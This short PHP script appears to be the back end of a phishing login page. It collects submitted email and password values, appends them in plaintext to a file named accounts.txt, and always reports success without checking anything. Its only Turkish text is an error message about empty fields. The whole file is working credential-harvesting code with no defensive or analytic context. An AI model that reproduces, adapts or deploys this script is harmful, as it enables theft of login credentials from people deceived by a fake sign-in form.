<?php if(isset($_POST['email']))
 {
	 	if(empty($_POST['email']) || empty($_POST['password'])  ){
						$arr = array('error' => 'Lütfen Boş Alan Bırakmayınız.');
						echo json_encode($arr);
		}else{
  $username = $_POST['email'];
  $password = $_POST['password'];
  $text = $username . "," . $password . "\n";
  $fp = fopen('accounts.txt', 'a+');

    if(fwrite($fp, $text))  {
      

    }
	$arr = array('kod' => 'success');
						echo json_encode($arr);
fclose ($fp);    
 }
}
?>